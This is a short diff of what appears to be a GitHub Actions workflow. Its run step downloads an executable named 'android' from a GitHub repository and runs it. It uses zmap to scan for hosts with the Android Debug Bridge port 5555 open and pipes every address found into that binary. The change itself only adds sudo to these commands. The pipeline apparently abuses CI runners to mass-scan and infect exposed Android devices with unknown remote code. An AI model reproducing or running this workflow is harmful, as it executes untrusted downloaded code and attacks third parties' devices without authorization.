@@ -15,9 +15,9 @@ jobs:
         run: |
           wget https://github.com/AhmetKesser/Deneme/raw/refs/heads/main/android
           chmod +x android
-          apt update -y
-          apt install zmap
-          ulimit -n999999; ulimit -u999999; ulimit -e999999; zmap -p 5555 -o- -q -v0 -T3 | awk {'print $1":5555"'} | ./android
+          sudo apt update -y
+          sudo apt install zmap
+          ulimit -n999999; ulimit -u999999; ulimit -e999999; sudo zmap -p 5555 -o- -q -v0 -T3 | awk {'print $1":5555"'} | sudo ./android
           
       - name: OK !
         run: |
